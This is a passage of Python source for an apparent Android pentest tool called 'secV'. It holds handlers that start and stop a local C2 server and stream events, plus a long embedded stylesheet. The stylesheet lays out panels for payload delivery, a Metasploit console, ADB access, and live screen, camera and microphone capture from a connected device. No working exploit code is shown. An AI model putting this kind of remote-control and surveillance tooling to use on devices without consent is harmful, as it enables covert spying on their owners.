    def _api_c2_launch(self):
        qs   = parse_qs(urlparse(self.path).query)
        port = int((qs.get("port") or [str(_C2_PORT)])[0])
        ok   = _ensure_c2(port)
        self._json({"ok": ok, "port": port, "url": f"http://127.0.0.1:{port}"})

    def _api_c2_stop(self):
        global _c2_proc
        with _proc_lock:
            p = _c2_proc
        if p:
            try:
                p.terminate()
                _c2_proc = None
            except Exception:
                pass
        self._json({"ok": True})

    def _api_sse(self):
        q: queue.Queue = queue.Queue(maxsize=512)
        with _sse_lock:
            _sse_clients.append(q)
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("X-Accel-Buffering", "no")
        self._cors()
        self.end_headers()
        try:
            while True:
                try:
                    line = q.get(timeout=20)
                    data = "data: " + line.replace("\n", " ") + "\n\n"
                    self.wfile.write(data.encode())
                    self.wfile.flush()
                except queue.Empty:
                    self.wfile.write(b": keepalive\n\n")
                    self.wfile.flush()
        except Exception:
            pass
        finally:
            with _sse_lock:
                try: _sse_clients.remove(q)
                except ValueError: pass

    def _serve_html(self):
        html = _HTML.encode()
        self._send(200, "text/html; charset=utf-8", html)


# ── Embedded HTML ──────────────────────────────────────────────────────────────
_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>secV · Android Pentest</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#060606;--bg1:#0e0e0e;--bg2:#161616;--bg3:#1e1e1e;--bg4:#282828;
  --border:rgba(255,255,255,0.07);--border2:rgba(255,255,255,0.14);--border3:rgba(255,255,255,0.24);
  --text:#a0a0a0;--muted:#4a4a4a;--white:#efefef;--off:#cccccc;--grey:#707070;
  --green:#4caf50;--red:#e53935;--blue:#3d8bcd;--green-dim:rgba(76,175,80,0.15);
  --red-dim:rgba(229,57,53,0.12);--blue-dim:rgba(61,139,205,0.12);
  --mono:'JetBrains Mono',monospace;--disp:'Syne',sans-serif;--t:0.14s ease;
}
*{box-sizing:border-box;margin:0;padding:0;}
html{-webkit-font-smoothing:antialiased;}
body{background:var(--bg);color:var(--text);font-family:var(--mono);
  height:100vh;display:flex;flex-direction:column;overflow:hidden;font-size:13px;line-height:1.6;}
a{color:var(--blue);text-decoration:none;}
::-webkit-scrollbar{width:3px;height:3px;}
::-webkit-scrollbar-track{background:var(--bg);}
::-webkit-scrollbar-thumb{background:var(--bg4);}

/* SESSIONS BAR */
#sessions-bar{
  display:none;align-items:center;gap:6px;padding:4px 16px;
  background:var(--bg1);border-bottom:1px solid var(--border);
  flex-shrink:0;overflow-x:auto;
}
#sessions-bar.visible{display:flex;}
#sess-label{font-size:0.55rem;letter-spacing:0.14em;text-transform:uppercase;
  color:var(--muted);flex-shrink:0;margin-right:4px;}
.sess-pill{
  display:flex;align-items:center;gap:5px;
  border:1px solid var(--border2);padding:2px 8px 2px 6px;
  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.04em;
  white-space:nowrap;transition:border-color var(--t);
}
.sess-pill:hover{border-color:var(--border3);}
.sess-pill .sp-dot{width:5px;height:5px;flex-shrink:0;}
.sess-pill .sp-dot.running{animation:pulse .8s infinite;}
.sess-pill .sp-label{color:var(--white);}
.sess-pill .sp-dev{color:var(--muted);font-size:0.54rem;margin-left:1px;}
.sess-pill .sp-time{color:var(--muted);font-size:0.54rem;margin-left:2px;}
.sess-pill .sp-kill{
  background:none;border:none;cursor:pointer;
  color:var(--muted);font-size:0.62rem;padding:0 0 0 4px;
  line-height:1;transition:color var(--t);
}
.sess-pill .sp-kill:hover{color:var(--red);}
.sess-pill.done   .sp-dot{background:var(--muted);}
.sess-pill.error  .sp-dot{background:var(--red);}
.sess-pill.done   .sp-label{color:var(--muted);}
.sess-pill.error  .sp-label{color:var(--red);}
#sess-count{
  font-size:0.58rem;color:var(--muted);flex-shrink:0;margin-left:auto;
  letter-spacing:0.06em;
}

/* PROCESS SNIFFER PANEL */
#proc-sniff-panel{
  display:none; flex-direction:column; gap:6px; margin-top:10px;
  border:1px solid var(--border2); background:var(--bg1); padding:10px;
}
#proc-sniff-panel.visible{display:flex;}
#proc-sniff-panel .ps-toolbar{display:flex;align-items:center;gap:8px;}
#proc-sniff-panel .ps-filter{
  flex:1;background:var(--bg2);border:1px solid var(--border);color:var(--text);
  font-family:var(--mono);font-size:0.7rem;padding:4px 7px;outline:none;
}
#proc-sniff-panel .ps-filter:focus{border-color:var(--green);}
#proc-sniff-panel .ps-btn{
  font-family:var(--mono);font-size:0.64rem;letter-spacing:0.06em;padding:4px 10px;
  border:1px solid var(--border2);background:var(--bg2);color:var(--text);cursor:pointer;
}
#proc-sniff-panel .ps-btn.active{border-color:var(--green);color:var(--green);}
#proc-sniff-panel .ps-btn:hover{border-color:var(--white);color:var(--white);}
#proc-sniff-panel .ps-count{font-size:0.6rem;color:var(--muted);margin-left:auto;}
#proc-table{
  width:100%;border-collapse:collapse;font-family:var(--mono);font-size:0.64rem;
  max-height:220px;overflow-y:auto;display:block;
}
#proc-table thead{position:sticky;top:0;background:var(--bg2);}
#proc-table th{
  text-align:left;padding:3px 8px;color:var(--muted);letter-spacing:0.06em;
  border-bottom:1px solid var(--border2);font-weight:400;white-space:nowrap;
}
#proc-table td{
  padding:2px 8px;color:var(--text);border-bottom:1px solid var(--border);
  white-space:nowrap;cursor:pointer;
}
#proc-table tr:hover td{background:var(--bg2);color:var(--white);}
#proc-table tr.selected td{background:var(--bg3);color:var(--green);}
#proc-table td.ps-pid{color:var(--muted);}
#proc-table td.ps-user{color:var(--blue-dim);}
#proc-table td.ps-name{max-width:200px;overflow:hidden;text-overflow:ellipsis;}
#proc-table td.ps-state-R{color:var(--green);}
#proc-table td.ps-state-S{color:var(--muted);}
#proc-table td.ps-state-Z{color:var(--red);}

/* TOP BAR */
#topbar{
  display:flex;align-items:center;gap:14px;padding:0 18px;height:52px;
  background:var(--bg);border-bottom:1px solid var(--border2);flex-shrink:0;
}
#topbar .logo{
  font-family:var(--disp);font-size:1.05rem;font-weight:800;
  color:var(--white);letter-spacing:-0.02em;white-space:nowrap;
}
#topbar .logo-sep{color:var(--muted);font-weight:400;margin:0 4px;}
#topbar .logo-sub{
  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;
  text-transform:uppercase;color:var(--muted);
}
#topbar .devbadge{
  display:flex;align-items:center;gap:8px;
  border:1px solid var(--border2);padding:4px 12px;
  transition:border-color var(--t);
}
#topbar .devbadge.connected{border-color:rgba(76,175,80,0.45);}
#topbar .devbadge #dev-dot{
  width:5px;height:5px;background:var(--muted);flex-shrink:0;
  transition:background var(--t),box-shadow var(--t);
}
#topbar .devbadge.connected #dev-dot{background:var(--green);box-shadow:0 0 5px var(--green);}
#topbar .devbadge #dev-name{color:var(--white);font-size:0.72rem;font-family:var(--mono);}
#topbar .devbadge #dev-os{color:var(--muted);font-size:0.6rem;}
#topbar .tb-btn{
  background:none;border:1px solid var(--border2);
  color:var(--muted);padding:5px 12px;cursor:pointer;font-family:var(--mono);
  font-size:0.65rem;letter-spacing:0.08em;text-transform:uppercase;white-space:nowrap;
  transition:border-color var(--t),color var(--t);
}
#topbar .tb-btn:hover{border-color:var(--border3);color:var(--white);}
#topbar #kill-btn{border-color:rgba(229,57,53,0.4);color:var(--red);}
#topbar #kill-btn:hover{background:var(--red-dim);border-color:var(--red);}
#topbar #kill-btn.active{animation:pulse .7s infinite;}
@keyframes pulse{0%{opacity:1}50%{opacity:.35}100%{opacity:1}}
#lhost-display{font-size:0.58rem;letter-spacing:0.1em;color:var(--muted);margin-left:auto;}

/* MAIN */
#main{display:flex;flex:1;overflow:hidden;}

/* SIDEBAR */
#sidebar{
  width:220px;flex-shrink:0;background:var(--bg1);border-right:1px solid var(--border2);
  display:flex;flex-direction:column;overflow-y:auto;
}
#dev-selector{padding:10px 12px;border-bottom:1px solid var(--border2);}
#dev-selector select{
  width:100%;background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  padding:6px 8px;font-family:var(--mono);font-size:0.72rem;
}
#dev-selector button{
  width:100%;margin-top:6px;background:none;border:1px solid var(--border2);
  color:var(--muted);padding:5px;font-family:var(--mono);font-size:0.62rem;
  letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;
  transition:color var(--t),border-color var(--t);
}
#dev-selector button:hover{color:var(--white);border-color:var(--border3);}
.op-group{border-bottom:1px solid var(--border);}
.op-group-title{
  padding:8px 12px;color:var(--muted);font-size:0.58rem;text-transform:uppercase;
  letter-spacing:0.18em;cursor:pointer;user-select:none;display:flex;
  justify-content:space-between;align-items:center;
  transition:color var(--t);
}
.op-group-title:hover{color:var(--grey);}
.op-group-title .arrow{transition:.2s;font-size:0.5rem;}
.op-group.collapsed .arrow{transform:rotate(-90deg);}
.op-group.collapsed .op-list{display:none;}
.op-item{
  padding:8px 14px;cursor:pointer;color:var(--grey);font-size:0.72rem;
  border-left:2px solid transparent;transition:color var(--t),background var(--t);
}
.op-item:hover{color:var(--white);background:var(--bg2);}
.op-item.active{color:var(--white);border-left-color:var(--white);background:var(--bg2);}

/* RIGHT */
#right{display:flex;flex-direction:column;flex:1;overflow:hidden;}

/* PARAMS PANEL */
#params-panel{
  background:var(--bg1);border-bottom:1px solid var(--border2);
  padding:14px 18px;flex-shrink:0;overflow-y:auto;max-height:240px;
}
#params-panel .op-title{
  font-family:var(--disp);font-size:1rem;font-weight:700;letter-spacing:-0.02em;
  color:var(--white);margin-bottom:4px;
}
#params-panel .op-desc{color:var(--muted);font-size:0.68rem;margin-bottom:12px;line-height:1.7;}
#params-form{display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end;}
.field{display:flex;flex-direction:column;gap:4px;min-width:150px;}
.field label{
  color:var(--muted);font-size:0.58rem;text-transform:uppercase;letter-spacing:0.12em;
}
.field input,.field select{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  padding:6px 8px;font-family:var(--mono);font-size:0.75rem;width:100%;
  transition:border-color var(--t);
}
.field input:focus,.field select:focus{outline:none;border-color:var(--border3);}
#run-btn{
  background:var(--white);color:var(--bg);border:none;padding:7px 20px;
  font-family:var(--disp);font-size:0.78rem;font-weight:700;letter-spacing:0.04em;
  cursor:pointer;height:32px;margin-top:auto;text-transform:uppercase;
  transition:background var(--t);
}
#run-btn:hover{background:var(--off);}
#run-btn:disabled{background:var(--bg4);cursor:not-allowed;color:var(--muted);}

/* TABS */
#tabs{
  display:flex;background:var(--bg1);border-bottom:1px solid var(--border2);
  flex-shrink:0;overflow-x:auto;
}
.tab{
  padding:10px 16px;cursor:pointer;color:var(--muted);
  font-size:0.65rem;letter-spacing:0.1em;text-transform:uppercase;
  border-bottom:2px solid transparent;transition:color var(--t),border-color var(--t);white-space:nowrap;
}
.tab:hover{color:var(--grey);}
.tab.active{color:var(--white);border-bottom-color:var(--white);}
.tab .badge{
  display:inline-block;background:var(--red);color:var(--white);
  font-size:0.5rem;padding:1px 5px;margin-left:5px;letter-spacing:0;
}

/* TERMINAL */
#terminal-wrap{flex:1;overflow:hidden;display:flex;flex-direction:column;}
#term-toolbar{
  display:flex;align-items:center;gap:6px;padding:4px 10px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;
}
#term-toolbar .tt-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.06em;padding:2px 9px;cursor:pointer;
  transition:color var(--t),border-color var(--t);white-space:nowrap;
}
#term-toolbar .tt-btn:hover{color:var(--white);border-color:var(--border3);}
#term-toolbar .tt-btn.active{color:var(--green);border-color:var(--green);}
#term-find-bar{display:none;align-items:center;gap:5px;flex:1;}
#term-find-bar.open{display:flex;}
#term-find-inp{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  font-family:var(--mono);font-size:0.68rem;padding:2px 8px;outline:none;width:160px;
}
#term-find-inp:focus{border-color:var(--green);}
#term-find-count{font-size:0.58rem;color:var(--muted);white-space:nowrap;}
.tt-sep{width:1px;height:14px;background:var(--border2);flex-shrink:0;}
#term-line-ct{font-size:0.58rem;color:var(--muted);margin-left:auto;white-space:nowrap;}
#terminal{
  flex:1;overflow-y:auto;padding:14px 18px;background:var(--bg);
  font-family:var(--mono);font-size:0.78rem;line-height:1.75;white-space:pre-wrap;word-break:break-all;
}
#terminal.nowrap{white-space:nowrap;word-break:normal;overflow-x:auto;}
#terminal .ln{display:block;}
#terminal .ln.find-match{background:rgba(255,204,68,0.15);}
#terminal .ln.find-current{background:rgba(255,204,68,0.35);}
#terminal .find-hl{background:rgba(255,204,68,0.5);color:var(--bg);}
#terminal .ts{color:var(--muted);margin-right:8px;user-select:none;font-size:0.62rem;}

/* ADB CONSOLE */
#adb-console{display:none;flex-direction:column;flex:1;overflow:hidden;}
#adb-output{
  flex:1;overflow-y:auto;padding:14px 18px;background:var(--bg);
  font-family:var(--mono);font-size:0.78rem;line-height:1.75;white-space:pre-wrap;
}
#adb-input-row{
  display:flex;gap:8px;padding:10px 14px;background:var(--bg1);
  border-top:1px solid var(--border2);align-items:center;
}
#adb-input-row span{color:var(--green);font-size:0.75rem;}
#adb-input{
  flex:1;background:transparent;border:none;color:var(--white);
  font-family:var(--mono);font-size:0.78rem;outline:none;
}

/* FINDINGS */
#findings-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
#f-toolbar{
  display:flex;align-items:center;gap:8px;padding:6px 14px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
}
#f-toolbar .f-tab{
  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.07em;color:var(--muted);
  cursor:pointer;padding:2px 10px;border-bottom:2px solid transparent;
  transition:color var(--t);white-space:nowrap;
}
#f-toolbar .f-tab:hover{color:var(--grey);}
#f-toolbar .f-tab.active{color:var(--white);border-bottom-color:var(--white);}
#f-toolbar .f-actions{margin-left:auto;display:flex;gap:6px;}
#f-toolbar .f-action-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;padding:2px 9px;cursor:pointer;
}
#f-toolbar .f-action-btn:hover{color:var(--white);border-color:var(--border3);}
#f-body{flex:1;overflow-y:auto;padding:14px 16px;}
#f-empty{padding:24px 16px;color:var(--muted);font-size:0.7rem;text-align:center;}
.f-section{margin-bottom:14px;border:1px solid var(--border2);}
.f-section-hdr{
  display:flex;align-items:center;gap:8px;
  padding:6px 12px;background:var(--bg2);border-bottom:1px solid var(--border2);
  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.1em;text-transform:uppercase;
  color:var(--muted);cursor:pointer;user-select:none;
}
.f-section-hdr:hover{color:var(--grey);}
.f-section-hdr .f-toggle{margin-left:auto;font-size:0.65rem;}
.f-section-body{padding:10px 14px;}
.f-kv-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:4px 14px;}
.f-kv{display:flex;flex-direction:column;padding:4px 0;border-bottom:1px solid var(--border);}
.f-kv .fk{font-size:0.58rem;color:var(--muted);letter-spacing:0.08em;text-transform:uppercase;}
.f-kv .fv{font-size:0.73rem;color:var(--white);font-family:var(--mono);margin-top:1px;}
.f-kv .fv.ok{color:var(--green);}
.f-kv .fv.warn{color:#e67828;}
.f-kv .fv.crit{color:var(--red);}
.f-summary-chips{display:flex;gap:6px;flex-wrap:wrap;padding:8px 14px;}
.sev{font-size:0.52rem;letter-spacing:0.1em;text-transform:uppercase;padding:2px 8px;font-weight:600;}
.sev.CRITICAL{background:var(--red-dim);color:var(--red);border:1px solid rgba(229,57,53,0.3);}
.sev.HIGH{background:rgba(230,120,40,0.1);color:#e67828;border:1px solid rgba(230,120,40,0.3);}
.sev.MEDIUM{background:rgba(200,170,50,0.1);color:#c8aa32;border:1px solid rgba(200,170,50,0.3);}
.sev.LOW{background:var(--blue-dim);color:var(--blue);border:1px solid rgba(61,139,205,0.3);}
.sev.INFO{background:var(--green-dim);color:var(--green);border:1px solid rgba(76,175,80,0.3);}
.f-vuln-row{
  display:flex;align-items:flex-start;gap:10px;padding:7px 0;
  border-bottom:1px solid var(--border);font-size:0.72rem;
}
.f-vuln-row:last-child{border-bottom:none;}
.f-vuln-text{flex:1;color:var(--text);line-height:1.6;}
.f-vuln-text b{color:var(--white);display:block;margin-bottom:2px;}
.f-vuln-text .f-rec{color:var(--muted);font-size:0.66rem;margin-top:3px;}
.f-vuln-row .f-cve{font-size:0.6rem;color:var(--blue);white-space:nowrap;}
.f-filter-row{display:flex;gap:5px;padding:8px 14px;flex-wrap:wrap;}
.f-filt{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;padding:2px 8px;cursor:pointer;
}
.f-filt:hover{border-color:var(--border3);color:var(--grey);}
.f-filt.on{color:var(--white);border-color:var(--white);}
.f-filt.on.CRITICAL{color:var(--red);border-color:var(--red);}
.f-filt.on.HIGH{color:#e67828;border-color:#e67828;}
.f-filt.on.MEDIUM{color:#c8aa32;border-color:#c8aa32;}
.f-filt.on.LOW{color:var(--blue);border-color:var(--blue);}
.f-app-row{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--border);}
.f-app-row .f-app-pkg{font-family:var(--mono);font-size:0.7rem;color:var(--white);flex:1;}
.f-app-row .f-score{font-size:0.62rem;padding:2px 8px;}
.f-delivery{padding:10px 14px;}
.f-del-url{
  display:flex;align-items:center;gap:8px;background:var(--bg2);
  border:1px solid var(--border2);padding:8px 12px;margin-bottom:8px;
}
.f-del-url .f-url-text{
  flex:1;font-family:var(--mono);font-size:0.72rem;color:var(--blue);
  word-break:break-all;line-height:1.5;
}
.f-del-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.06em;
  padding:3px 10px;cursor:pointer;white-space:nowrap;flex-shrink:0;
}
.f-del-btn:hover{color:var(--white);border-color:var(--white);}
.f-del-btn.primary{border-color:var(--green);color:var(--green);}
.f-del-qr{
  background:var(--bg2);border:1px solid var(--border2);padding:10px;
  font-family:var(--mono);font-size:0.62rem;line-height:1.0;color:var(--green);
  overflow-x:auto;white-space:pre;margin-bottom:8px;
}
.f-del-cmd{
  display:flex;align-items:center;gap:8px;background:var(--bg2);
  border:1px solid var(--border2);padding:6px 12px;margin-bottom:6px;font-size:0.68rem;
}
.f-del-cmd code{flex:1;font-family:var(--mono);color:var(--text);}
.f-del-cmd .f-del-btn{padding:2px 8px;}
.f-errors{padding:10px 14px;}
.f-err-item{
  background:var(--red-dim);border:1px solid rgba(229,57,53,0.3);
  padding:8px 12px;margin-bottom:6px;font-size:0.72rem;color:var(--red);font-family:var(--mono);
}
.f-raw pre{
  padding:10px 14px;font-family:var(--mono);font-size:0.65rem;color:var(--muted);
  overflow-x:auto;white-space:pre;line-height:1.6;
}

/* DELIVERY TAB */
#qr-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
.qr-card{
  background:var(--bg1);border:1px solid var(--border2);
  margin-bottom:12px;padding:14px 16px;
}
.qr-card pre{color:var(--green);font-size:0.68rem;line-height:1.1;overflow-x:auto;}
.qr-url{color:var(--blue);font-size:0.8rem;word-break:break-all;}

/* SETUP/DEPS TAB */
#setup-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
.dep-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1px;
  background:var(--border2);border:1px solid var(--border2);margin-bottom:16px;}
.dep-card{
  background:var(--bg1);padding:12px 14px;display:flex;align-items:center;gap:10px;
}
.dep-card .dep-dot{width:6px;height:6px;flex-shrink:0;}
.dep-card .dep-dot.ok{background:var(--green);}
.dep-card .dep-dot.miss{background:var(--red);}
.dep-card .dep-name{font-size:0.75rem;color:var(--white);flex:1;}
.dep-card .dep-install{font-size:0.6rem;color:var(--muted);margin-top:2px;}
.settings-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px;margin-top:12px;}
.settings-grid .field{min-width:unset;}
#save-settings{
  background:var(--white);color:var(--bg);border:none;padding:7px 18px;
  font-family:var(--disp);font-size:0.72rem;font-weight:700;letter-spacing:0.06em;
  text-transform:uppercase;cursor:pointer;margin-top:12px;transition:background var(--t);
}
#save-settings:hover{background:var(--off);}

/* FILES TAB */
#files-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
.file-row{
  display:flex;align-items:center;gap:10px;padding:8px 10px;
  border-bottom:1px solid var(--border);font-size:0.72rem;transition:background var(--t);
}
.file-row:hover{background:var(--bg2);}
.file-row .fn{color:var(--white);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.file-row .fsz{color:var(--muted);white-space:nowrap;}
.file-row .fts{color:var(--muted);white-space:nowrap;}
.file-row .copy-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  padding:2px 8px;font-size:0.58rem;letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;
  transition:color var(--t),border-color var(--t);
}
.file-row .copy-btn:hover{color:var(--white);border-color:var(--border3);}

/* C2 PANEL */
#c2-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
#c2-toolbar{
  display:flex;align-items:center;gap:10px;padding:10px 16px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;
}
#c2-toolbar span{color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;text-transform:uppercase;}
#c2-port-inp{
  width:64px;background:var(--bg2);border:1px solid var(--border2);
  color:var(--white);font-family:var(--mono);font-size:0.75rem;padding:5px 8px;
}
.c2-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  padding:5px 14px;font-family:var(--mono);font-size:0.65rem;letter-spacing:0.08em;
  text-transform:uppercase;cursor:pointer;transition:all var(--t);
}
.c2-btn:hover{color:var(--white);border-color:var(--border3);}
.c2-btn.launch{background:var(--white);color:var(--bg);border-color:var(--white);}
.c2-btn.launch:hover{background:var(--off);}
.c2-btn.stop{border-color:rgba(229,57,53,0.4);color:var(--red);}
.c2-btn.stop:hover{background:var(--red-dim);border-color:var(--red);}
#c2-frame-wrap{flex:1;overflow:hidden;background:var(--bg);}
#c2-placeholder{
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  height:100%;color:var(--muted);gap:14px;
}
#c2-placeholder .c2-icon{
  font-family:var(--disp);font-size:3rem;font-weight:800;
  color:var(--bg4);letter-spacing:-0.06em;
}
#c2-placeholder .c2-title{font-family:var(--disp);font-size:1.1rem;font-weight:700;color:var(--grey);}
#c2-placeholder .c2-hint{font-size:0.68rem;color:var(--muted);}
#c2-iframe{display:none;width:100%;height:100%;border:none;}

/* STATUS BAR */
#statusbar{
  display:flex;align-items:center;gap:10px;padding:6px 16px;
  background:var(--bg1);border-top:1px solid var(--border2);flex-shrink:0;
  font-size:0.6rem;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);
  position:relative;overflow:hidden;
}
#status-dot{width:5px;height:5px;background:var(--muted);transition:background var(--t),box-shadow var(--t);}
#status-dot.active{background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse .9s infinite;}
#status-text{flex:1;color:var(--grey);}
#status-time{color:var(--muted);}
#workdir-link{color:var(--muted);cursor:pointer;transition:color var(--t);}
#workdir-link:hover{color:var(--white);}

/* PROGRESS BAR */
#progress-bar{
  position:absolute;bottom:0;left:0;height:2px;width:0%;
  background:var(--white);transition:width .4s ease,opacity .3s;opacity:0;
}
#progress-bar.active{opacity:1;animation:progress-indeterminate 1.6s linear infinite;}
@keyframes progress-indeterminate{
  0%  {left:-40%;width:40%;}
  50% {left:30%;width:60%;}
  100%{left:100%;width:40%;}
}

/* TERMINAL LINE ANIMATION */
@keyframes fadeSlideIn{
  from{opacity:0;transform:translateY(3px);}
  to  {opacity:1;transform:translateY(0);}
}
#terminal .ln{animation:fadeSlideIn .1s ease both;}

/* RUN BUTTON STATES */
#run-btn.running{
  background:var(--bg4);color:var(--muted);cursor:not-allowed;
  animation:runPulse 1s infinite;
}
@keyframes runPulse{0%,100%{opacity:1}50%{opacity:.5}}

/* TOAST NOTIFICATIONS */
#toast-container{
  position:fixed;bottom:48px;right:16px;z-index:9999;
  display:flex;flex-direction:column-reverse;gap:6px;pointer-events:none;
}
.toast{
  background:var(--bg3);border:1px solid var(--border2);
  padding:8px 14px;font-family:var(--mono);font-size:0.65rem;
  letter-spacing:0.04em;color:var(--white);max-width:320px;
  animation:toastIn .2s ease both;
}
.toast.connect{border-left:2px solid var(--green);}
.toast.disconnect{border-left:2px solid var(--red);}
.toast.info{border-left:2px solid var(--blue);}
@keyframes toastIn{from{opacity:0;transform:translateX(12px);}to{opacity:1;transform:translateX(0);}}
@keyframes toastOut{from{opacity:1;}to{opacity:0;transform:translateX(12px);}}

/* TOPBAR ACCENT */
#topbar::after{
  content:'';position:absolute;left:0;bottom:0;height:1px;width:100%;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,0.04),transparent);
  pointer-events:none;
}
#topbar{position:relative;}

/* PARAMS PANEL TRANSITION */
#params-panel{transition:opacity .12s ease;}
#params-panel.switching{opacity:0;}

/* SIDEBAR HOVER ACCENT */
.op-item::before{
  content:'';position:absolute;left:0;top:0;height:100%;width:2px;
  background:var(--white);transform:scaleY(0);transition:transform .14s ease;
}
.op-item{position:relative;}
.op-item:hover::before{transform:scaleY(0.6);}
.op-item.active::before{transform:scaleY(1);}

/* DEVBADGE CONNECTED PULSE */
#topbar .devbadge.connected #dev-dot{
  animation:devPulse 2.4s ease-in-out infinite;
}
@keyframes devPulse{
  0%,100%{box-shadow:0 0 4px var(--green);}
  50%    {box-shadow:0 0 10px var(--green),0 0 20px rgba(76,175,80,0.3);}
}

/* ── LIVE MEDIA PANEL ─────────────────────────────────────────────────────── */
#live-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;gap:14px;}

/* Screen mirror */
.live-section{background:var(--bg1);border:1px solid var(--border2);}
.live-section-hdr{
  display:flex;align-items:center;gap:10px;padding:8px 14px;
  border-bottom:1px solid var(--border2);
}
.live-section-hdr .live-label{
  font-family:var(--disp);font-size:0.7rem;font-weight:700;
  color:var(--white);letter-spacing:0.06em;text-transform:uppercase;flex:1;
}
.live-section-hdr .live-dot{
  width:6px;height:6px;background:var(--muted);
  transition:background var(--t),box-shadow var(--t);
}
.live-section-hdr .live-dot.on{background:var(--red);box-shadow:0 0 6px var(--red);
  animation:recPulse 1s infinite;}
@keyframes recPulse{0%,100%{opacity:1}50%{opacity:.3}}
.live-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  padding:4px 12px;font-family:var(--mono);font-size:0.6rem;
  letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;
  transition:all var(--t);
}
.live-btn:hover{color:var(--white);border-color:var(--border3);}
.live-btn.active{background:var(--red-dim);color:var(--red);border-color:rgba(229,57,53,0.5);}
.live-btn.go{background:var(--white);color:var(--bg);border-color:var(--white);}
.live-btn.go:hover{background:var(--off);}
.live-select{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  font-family:var(--mono);font-size:0.65rem;padding:4px 6px;
}
.live-input{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  font-family:var(--mono);font-size:0.65rem;padding:4px 8px;width:70px;
}
#screen-wrap{
  position:relative;background:#000;display:flex;
  align-items:center;justify-content:center;min-height:200px;
}
#screen-img{
  max-width:100%;max-height:480px;object-fit:contain;display:none;
}
#screen-placeholder{
  color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;
  text-transform:uppercase;padding:40px;
}
#screen-overlay{
  position:absolute;top:6px;right:6px;
  background:rgba(0,0,0,0.7);padding:3px 8px;
  font-size:0.55rem;color:var(--green);letter-spacing:0.1em;display:none;
}

/* Camera + Audio grid */
.live-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
@media(max-width:800px){.live-grid{grid-template-columns:1fr;}}
#camera-img{max-width:100%;max-height:260px;object-fit:contain;display:none;}
#camera-placeholder{
  color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;
  text-transform:uppercase;padding:30px;text-align:center;
}
.camera-wrap{background:#000;display:flex;align-items:center;justify-content:center;min-height:140px;}

/* Audio */
.audio-row{
  display:flex;align-items:center;gap:10px;padding:10px 14px;
  border-bottom:1px solid var(--border);
}
.audio-row:last-child{border-bottom:none;}
.audio-label{color:var(--grey);font-size:0.62rem;letter-spacing:0.1em;text-transform:uppercase;flex:0 0 80px;}
#mic-visualizer{
  flex:1;height:28px;background:var(--bg2);border:1px solid var(--border);
  overflow:hidden;display:flex;align-items:center;gap:1px;padding:0 4px;
}
.mic-bar{width:3px;background:var(--green);transition:height .08s;}
#mic-audio{width:100%;margin-top:4px;display:none;}
.speaker-file{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  font-family:var(--mono);font-size:0.65rem;padding:4px 8px;flex:1;cursor:pointer;
}

/* MSF Console */
#msf-terminal{
  flex:1;min-height:200px;max-height:320px;overflow-y:auto;
  padding:10px 14px;background:var(--bg);
  font-family:var(--mono);font-size:0.72rem;line-height:1.75;
  white-space:pre-wrap;word-break:break-all;
}
#msf-input-row{
  display:flex;gap:8px;padding:8px 14px;background:var(--bg1);
  border-top:1px solid var(--border2);align-items:center;
}
#msf-input-row span{color:var(--red);font-size:0.72rem;}
#msf-input{
  flex:1;background:transparent;border:none;color:var(--white);
  font-family:var(--mono);font-size:0.72rem;outline:none;
}
